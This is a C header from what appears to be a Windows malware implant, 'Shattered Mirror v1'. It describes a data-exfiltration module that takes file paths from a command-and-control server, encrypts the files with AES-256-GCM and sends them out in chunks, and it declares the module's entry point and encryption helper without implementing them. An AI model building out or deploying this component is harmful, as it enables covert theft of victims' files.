#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 05: Data Exfiltration
 *
 * Receives a file path from the C2, reads the file, encrypts it using
 * AES-256-GCM, and sends it back in 4KB chunks. Each chunk is prefixed
 * with a header containing sequence number, length, IV, and auth tag.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_05_EXFIL_H
#define SMIRROR_ATOM_05_EXFIL_H

#include <windows.h>

/* Setup exfiltration channel */
DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam);

/* External helper: Encrypts a chunk with AES-256-GCM using bcrypt.dll */
BOOL AesGcmEncrypt(const BYTE *pKey, const BYTE *pIv, const BYTE *pPlaintext,
                   DWORD dwPlainLen, BYTE *pCiphertext, BYTE *pTag);

#endif /* SMIRROR_ATOM_05_EXFIL_H */